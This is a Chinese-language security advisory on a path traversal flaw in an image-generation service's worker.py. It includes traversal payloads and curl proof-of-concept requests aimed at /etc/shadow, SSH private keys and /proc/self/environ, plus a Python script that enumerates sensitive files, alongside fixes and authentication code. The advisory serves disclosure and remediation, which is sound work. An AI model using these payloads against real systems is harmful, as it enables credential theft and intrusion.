# VULN-DF-PY-001: image 参数未验证路径致任意文件读取

## 漏洞摘要

| 字段 | 值 |
|-------|-------|
| **ID** | VULN-DF-PY-001 |
| **类型** | 路径遍历（读取） |
| **CWE** | CWE-22: 路径名限制不当（Improper Limitation of a Pathname to a Restricted Directory） |
| **严重性** | 高 |
| **置信度** | 85（已确认） |
| **位置** | `examples/service/worker.py:140-141` |
| **函数** | `generate()` |
| **来源模块** | examples/service |

## 漏洞描述

来自 HTTP 请求的 `image` 字段在没有任何路径验证或清理的情况下直接传递给 `Image.open()`。攻击者可以利用此漏洞，通过在 `image` 参数中使用路径遍历序列（`../`）来读取服务器上的任意文件。

### 漏洞代码

```python
# examples/service/worker.py:139-141
if request.image is not None:
    img = Image.open(request.image).convert("RGB")
    logging.info(f"Input image: {request.image}")
```

### 攻击链

```
HTTP POST /generate → GeneratorRequest(image=...) → worker.py:generate() → Image.open(request.image)
```

## 利用分析

### 攻击向量

1. **网络可访问**：服务绑定到 `0.0.0.0:6000`，**无身份验证**
2. **直接输入**：`image` 字段是 Pydantic 的 `Optional[str]` 类型，除类型检查外无任何验证
3. **无清理**：无路径遍历检查、无白名单、无符号链接检查
4. **PIL.Image.open()**：接受任何路径并尝试将其作为图像文件读取

### 利用场景

#### 场景 1：敏感文件泄露（Linux）

```http
POST /generate HTTP/1.1
Host: target-server:6000
Content-Type: application/json

{
    "prompt": "test",
    "sample_steps": 40,
    "task": "i2v-A14B",
    "image": "../../../etc/passwd"
}
```

**结果**：服务器尝试将 `/etc/passwd` 作为图像打开。虽然 PIL 可能无法将其解析为图像，但文件内容可能会被记录或通过错误消息暴露。

#### 场景 2：凭证文件提取

```json
{
    "image": "/root/.ssh/id_rsa"
}
```

**结果**：尝试读取 SSH 私钥。

#### 场景 3：应用程序配置泄露

```json
{
    "image": "/data/models/config.json"
}
```

**结果**：读取包含敏感参数的模型配置文件。

#### 场景 4：绝对路径访问

```json
{
    "image": "/proc/self/environ"
}
```

**结果**：读取环境变量，其中可能包含敏感信息（API 密钥、数据库凭证）。

### 基于错误的信息泄露

即使 PIL 无法解析非图像文件，也可以提取有价值的信息：

1. **文件存在性验证**：错误消息指示文件是否存在
2. **路径枚举**：可以通过错误枚举目录结构
3. **文件大小泄露**：PIL 错误消息通常包含文件元数据
4. **内容泄露**：错误处理可能会记录文件内容

### 影响评估

| 影响类别 | 严重性 | 描述 |
|-----------------|----------|-------------|
| **信息泄露** | **高** | 任意文件读取可导致凭证、密钥和敏感数据被提取 |
| **权限提升** | **中** | SSH 密钥、API 令牌可导致进一步入侵 |
| **系统枚举** | **高** | `/proc/*` 文件系统可进行详细的系统侦察 |
| **业务影响** | **高** | 模型权重、专有数据、客户信息面临风险 |

### 攻击前提条件

| 要求 | 状态 |
|-------------|--------|
| 端口 6000 的网络访问权限 | 必需（假设无防火墙） |
| 身份验证 | **无** - 服务未进行身份验证 |
| 文件权限 | 服务进程用户可读的文件 |
| PIL 兼容性 | 枚举攻击不需要 |

## 概念验证

### 基本路径遍历测试

```bash
# 测试相对路径遍历
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"task":"i2v-A14B","image":"../../../etc/passwd"}'

# 测试绝对路径访问
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"task":"i2v-A14B","image":"/etc/shadow"}'
```

### 自动化枚举脚本

```python
#!/usr/bin/env python3
import requests
import sys

# 敏感文件列表
SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/root/.ssh/id_rsa",
    "/root/.bash_history",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/auth.log",
]

def check_file(target, file_path):
    try:
        r = requests.post(f"{target}/generate", json={
            "prompt": "test",
            "sample_steps": 40,
            "task": "i2v-A14B",
            "image": file_path
        }, timeout=10)
        
        # 根据响应检查文件是否存在
        if "cannot identify image file" in r.text:
            print(f"[EXISTS] {file_path}")
        elif "No such file" in r.text:
            print(f"[NOT EXISTS] {file_path}")
        else:
            print(f"[UNKNOWN] {file_path} - {r.status_code}")
    except Exception as e:
        print(f"[ERROR] {file_path} - {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:6000"
    for f in SENSITIVE_FILES:
        check_file(target, f)
```

## 根本原因分析

### 漏洞存在原因

1. **缺少输入验证**：Pydantic 模型仅验证类型（Optional[str]），不验证内容
2. **直接使用文件 API**：直接使用 `Image.open()` 而非安全的封装函数
3. **未使用的安全控制**：项目在 `mindiesd/utils/file_utils.py` 中有 `safe_open()` 函数，包含符号链接检查、路径长度限制和权限验证 - 但在此代码路径中**未使用**
4. **无身份验证**：HTTP 服务无身份验证机制

### 与安全实现对比

**不安全的实现（当前）**：
```python
img = Image.open(request.image).convert("RGB")  # 无验证
```

**安全的实现（应该这样做）**：
```python
from mindiesd.utils.file_utils import safe_open, standardize_path

# 验证并清理路径
safe_path = standardize_path(request.image, check_link=True)
img = Image.open(safe_path).convert("RGB")  # 或使用 safe_open 封装函数
```

## 修复建议

### 优先级：P1（严重 - 立即修复）

### 1. 路径验证和清理

```python
# 在 worker.py 中 - 替换漏洞代码
import os
from pathlib import Path

ALLOWED_IMAGE_DIR = "/data/images"  # 白名单目录

def validate_image_path(image_path: str) -> str:
    """验证图像路径是否在允许的目录内。"""
    if not image_path:
        raise ValueError("图像路径不能为空")
    
    # 解析为绝对路径
    abs_path = os.path.realpath(image_path)
    
    # 检查白名单
    allowed_dir = os.path.realpath(ALLOWED_IMAGE_DIR)
    if not abs_path.startswith(allowed_dir + "/"):
        raise ValueError(f"图像路径必须在 {ALLOWED_IMAGE_DIR} 内")
    
    # 检查符号链接（使用现有的 safe_open 检查）
    if os.path.islink(image_path):
        raise ValueError("不允许使用符号链接")
    
    # 验证文件扩展名
    allowed_extensions = {".jpg", ".jpeg", ".png", ".bmp", ".webp"}
    if Path(abs_path).suffix.lower() not in allowed_extensions:
        raise ValueError(f"无效的图像扩展名：{Path(abs_path).suffix}")
    
    return abs_path

# 在 generate() 中使用
if request.image is not None:
    safe_path = validate_image_path(request.image)
    img = Image.open(safe_path).convert("RGB")
```

### 2. 使用现有的安全文件工具

```python
from mindiesd.utils.file_utils import standardize_path, check_file_safety

if request.image is not None:
    safe_path = standardize_path(request.image, check_link=True)
    check_file_safety(safe_path, permission_mode=0o640)
    img = Image.open(safe_path).convert("RGB")
```

### 3. 添加身份验证

```python
# 在 server.py 中 - 添加身份验证中间件
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

security = HTTPBearer()

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """验证 API 令牌。"""
    valid_tokens = os.environ.get("API_TOKENS", "").split(",")
    if credentials.credentials not in valid_tokens:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="身份验证凭据无效"
        )
    return credentials

@app.post("/generate")
async def generate_image(
    request: GeneratorRequest,
    _: HTTPAuthorizationCredentials = Depends(verify_token)
):
    # ... 现有逻辑
```

### 4. 网络绑定限制

```python
# 在 server.py 中 - 在生产环境中仅绑定到 localhost
uvicorn.run(app, host="127.0.0.1", port=6000)  # 替代 0.0.0.0
```

## 测试建议

1. **单元测试**：添加路径遍历防护测试
2. **集成测试**：验证身份验证中间件
3. **安全扫描**：运行自动化路径遍历测试
4. **渗透测试**：全面的文件泄露测试

## 参考资料

- [CWE-22: 路径名限制不当](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP 路径遍历攻击](https://owasp.org/www-community/attacks/Path_Traversal)
- [PIL Image.open 安全考虑](https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.open)
